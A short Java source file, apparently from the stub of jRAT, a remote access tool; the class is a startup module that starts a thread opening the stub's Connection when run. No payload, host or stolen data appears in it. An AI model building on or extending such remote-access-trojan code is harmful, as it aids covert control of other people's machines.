package io.jrat.stub.modules.startup;

import io.jrat.stub.Connection;
import java.util.Map;

public class ConnectionStarterStartupModule extends StartupModule {

	public ConnectionStarterStartupModule(Map<String, String> config) {
		super(config);
	}

	public void run() throws Exception {
		new Thread(new Connection()).start();
	}

}
